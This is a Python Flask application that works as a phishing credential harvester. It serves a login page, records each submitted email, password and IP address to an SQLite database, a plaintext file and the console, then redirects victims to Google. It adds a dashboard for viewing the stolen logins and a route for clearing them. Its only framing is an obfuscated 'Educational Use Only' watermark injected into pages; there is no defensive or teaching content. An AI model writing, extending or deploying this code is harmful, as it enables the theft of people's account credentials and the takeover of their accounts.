from flask import Flask, request, render_template, redirect
import sqlite3
from datetime import datetime
import base64

app = Flask(__name__)
_WATERMARK = base64.b64decode("aGFja2VyYWtzaGFyYXRpdA==").decode('utf-8')

if not _WATERMARK or len(_WATERMARK) < 5:
    raise Exception("Integrity check failed")

@app.after_request
def add_watermark(response):
    if response.content_type and 'text/html' in response.content_type:
        content = response.get_data(as_text=True)
        hidden = f'<!-- {_WATERMARK} -->'
        visible = f'''<style>.wm{{position:fixed !important;bottom:5px !important;right:15px !important;color:rgba(255,255,255,0.08)!important;font-size:11px!important;font-family:monospace!important;pointer-events:none!important;user-select:none!important;z-index:99999!important;}}</style><div class="wm"> {_WATERMARK} | Educational Use Only</div>'''
        js = '<script>setInterval(function(){if(!document.getElementById("wm")){var e=document.createElement("div");e.className="wm";e.id="wm";e.innerHTML=" '+_WATERMARK+' | Educational Use Only";document.body.appendChild(e)}},500);</script>'
        content = content.replace('</head>', visible + '</head>')
        content = content.replace('</body>', hidden + js + '</body>')
        response.set_data(content)
    return response

def init_db():
    conn = sqlite3.connect('database.db')
    conn.execute('CREATE TABLE IF NOT EXISTS credentials (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, ip TEXT, time TEXT)')
    conn.commit()
    conn.close()

def save_credential(email, password, ip):
    conn = sqlite3.connect('database.db')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    conn.execute('INSERT INTO credentials (email, password, ip, time) VALUES (?, ?, ?, ?)', (email, password, ip, timestamp))
    conn.commit()
    conn.close()
    with open('credentials.txt', 'a') as f:
        f.write(f"{timestamp} | IP: {ip} | Email: {email} | Pass: {password}\n")
    print(f"[+] {email} | {password}")

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr
    if email and password:
        save_credential(email, password, ip)
        return redirect('https://www.google.com')
    return "Fill all fields", 400

@app.route('/dashboard')
def dashboard():
    conn = sqlite3.connect('database.db')
    data = conn.execute('SELECT * FROM credentials ORDER BY id DESC').fetchall()
    conn.close()
    return render_template('dashboard.html', data=data)

@app.route('/clear')
def clear_data():
    conn = sqlite3.connect('database.db')
    conn.execute('DELETE FROM credentials')
    conn.commit()
    conn.close()
    open('credentials.txt', 'w').close()
    return redirect('/dashboard')

if __name__ == '__main__':
    init_db()
    print("\n" + "="*50)
    print(f"  {_WATERMARK}")
    print("="*50)
    print("  Server: http://127.0.0.1:3000")
    print("  Dashboard: http://127.0.0.1:3000/dashboard")
    print("="*50 + "\n")
    app.run(debug=True, host='0.0.0.0', port=3000)